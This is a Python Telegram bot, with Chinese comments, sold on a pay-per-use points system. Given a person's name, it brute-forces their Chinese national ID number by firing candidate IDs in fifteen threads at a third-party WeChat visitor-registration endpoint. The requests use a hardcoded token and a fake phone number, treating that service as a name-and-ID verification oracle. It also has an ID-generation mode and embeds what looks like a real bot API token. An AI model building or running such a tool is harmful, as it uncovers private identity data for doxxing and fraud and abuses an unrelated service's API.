import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 核心配置 =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
generated_cache = {}

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    
    # 优先从文件读取 Token，没有则用默认
    tk = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." 
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

# ================= 管理员专用指令 (放在最前面，保证必火) =================

@bot.message_handler(commands=['add'])
def admin_add(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, amt = message.text.split()
        uid = int(tid)
        user_points[uid] = user_points.get(uid, 0) + int(amt)
        with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)
        bot.reply_to(message, f"✅ 充值成功！用户 `{uid}` 当前余额: `{user_points[uid]}`")
    except:
        bot.reply_to(message, "使用格式: `/add 用户ID 积分`")

@bot.message_handler(commands=['set_token'])
def admin_set_token(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.reply_to(message, "🗝 **请发送新的 X-Token 内容:**")
    # 这里用 register_next_step 确保下一步只处理 Token
    bot.register_next_step_handler(msg, save_new_token)

def save_new_token(message):
    global CURRENT_X_TOKEN
    CURRENT_X_TOKEN = message.text.strip()
    with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
        f.write(CURRENT_X_TOKEN)
    bot.send_message(message.chat.id, "✅ Token 已更新并保存，立即生效！")

# ================= 用户基础指令 =================

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    # 只要点 start，清除该用户所有状态
    user_states.pop(message.chat.id, None)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("👤 核验模式", "🛠 生成模式")
    
    bot.send_message(message.chat.id, 
        f"👋 **欢迎使用核验机器人**\n\n"
        f"💰 你的积分: `{pts}`\n"
        f"💸 核验扣费: 100/次\n"
        f"💸 生成扣费: 50/次\n"
        f"👤 管理员: {ADMIN_USERNAME}", 
        parse_mode='Markdown')
    bot.send_message(message.chat.id, "请输入姓名开始核验：")
    user_states[message.chat.id] = {'step': 'v_name'}

@bot.message_handler(commands=['gen'])
def gen(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    user_states.pop(message.chat.id, None)
    bot.send_message(message.chat.id, f"🛠 **进入生成模式**\n💰 当前积分: `{pts}`\n请输入补全号码(如: 370481x...):")
    user_states[message.chat.id] = {'step': 'g_card'}

# ================= 核心逻辑 (15线程 + 进度条) =================

def run_task(chat_id, msg_id, name, ids, uid):
    global CURRENT_X_TOKEN
    total = len(ids)
    done = 0
    success_text = None
    stop_flag = False

    def update_progress():
        nonlocal done
        while not stop_flag and done < total:
            bar = "█" * int(16 * done / total) + "░" * (16 - int(16 * done / total))
            try:
                bot.edit_message_text(f"⌛ **核验中...**\n`[{bar}] {done}/{total}`", chat_id, msg_id, parse_mode='Markdown')
            except: pass
            time.sleep(2)

    threading.Thread(target=update_progress, daemon=True).start()

    def check(id_no):
        nonlocal done, success_text, stop_flag
        if stop_flag: return
        try:
            res = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", 
                json={"id_type":"id_card","mobile":"15555555555","id_no":id_no,"name":name},
                headers={"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}, 
                timeout=5).json()
            if res.get("code") == 0:
                success_text = f"✨ **发现成功匹配：**\n{name} `{id_no}` 二要素验证成功✅\n💰 **剩余积分:** {user_points[uid]}"
                stop_flag = True
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=15) as ex:
        ex.map(check, ids)
    
    stop_flag = True
    if success_text:
        bot.send_message(chat_id, success_text, parse_mode='Markdown')
    else:
        bot.edit_message_text("❌ 核验完成，未发现匹配结果。", chat_id, msg_id)

# ================= 状态机逻辑 =================

@bot.message_handler(func=lambda m: m.chat.id in user_states)
def handle_logic(m):
    uid = m.from_user.id
    state = user_states[m.chat.id]
    
    # 核验流程
    if state['step'] == 'v_name':
        user_states[m.chat.id] = {'step': 'v_ids', 'name': m.text.strip()}
        bot.send_message(m.chat.id, "请输入身份证列表：")
    
    elif state['step'] == 'v_ids':
        if user_points.get(uid, 0) < 100:
            bot.reply_to(m, "❌ 积分不足(需100)"); return
        v_ids = re.findall(r'\d{17}[\dXx]', m.text)
        if v_ids:
            user_points[uid] -= 100
            with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)
            msg = bot.send_message(m.chat.id, "⌛ 正在启动核验线程...")
            threading.Thread(target=run_task, args=(m.chat.id, msg.message_id, state['name'], v_ids, uid)).start()
        user_states.pop(m.chat.id)

    # 生成流程
    elif state['step'] == 'g_card':
        user_states[m.chat.id] = {'step': 'g_sex', 'card': m.text.lower()}
        bot.send_message(m.chat.id, "请输入性别(男/女/未知)：")

    elif state['step'] == 'g_sex':
        if user_points.get(uid, 0) < 50:
            bot.reply_to(m, "❌ 积分不足(需50)"); return
        bot.send_message(m.chat.id, "⌛ 正在计算组合...")
        # ... (此处省略重复的 ID 生成算法，确保逻辑与之前一致) ...
        # 生成成功后扣费 50
        user_points[uid] -= 50
        with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)
        # 发送文件并重置状态...
        user_states.pop(m.chat.id)

if __name__ == '__main__':
    print(">>> 机器人已启动，请发送 /start <<<")
    bot.infinity_polling()
